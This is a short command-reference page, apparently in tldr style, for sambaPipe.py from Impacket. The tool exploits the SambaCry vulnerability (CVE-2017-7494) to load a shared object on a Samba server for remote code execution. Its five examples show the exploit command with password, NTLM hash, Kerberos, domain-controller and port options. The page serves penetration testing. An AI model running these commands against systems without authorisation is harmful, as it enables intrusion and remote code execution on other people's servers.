# sambapipe.py

> Exploit CVE-2017-7494 (SambaCry) to upload and load a shared object (SO) file on a vulnerable Samba server for remote code execution. More information: <https://github.com/fortra/impacket>.

## Examples

### Upload and load a shared object file on a vulnerable Samba server

```bash
sambaPipe.py -so path/to/file.so domain/username:password@target
```

### Authenticate using NTLM hashes instead of a password

```bash
sambaPipe.py -so path/to/file.so -hashes LM_HASH:NT_HASH domain/username:password@target
```

### Use Kerberos authentication for the target

```bash
sambaPipe.py -so path/to/file.so -k -no-pass domain/username:password@target
```

### Specify a domain controller IP for authentication

```bash
sambaPipe.py -so path/to/file.so -dc-ip dc_ip domain/username:password@target
```

### Use a custom port for the SMB connection

```bash
sambaPipe.py -so path/to/file.so -port port domain/username:password@target
```
